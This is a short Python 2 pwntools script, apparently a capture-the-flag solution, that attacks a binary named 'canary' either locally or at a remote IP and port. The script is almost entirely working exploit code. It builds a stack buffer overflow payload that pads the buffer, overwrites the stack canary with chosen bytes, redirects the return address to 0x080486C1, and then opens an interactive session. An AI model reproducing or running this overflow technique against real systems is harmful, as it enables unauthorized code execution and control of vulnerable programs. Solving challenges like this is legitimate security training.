#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('canary')

host = args.HOST or '18.222.227.1'
port = int(args.PORT or 12345)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x08048799
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

payload = "A" * 40 + "\x00" * 4 + p32(0x2) + p32(0x0) * 2 + p32(0x080486C1)
io.send(payload)

io.interactive()

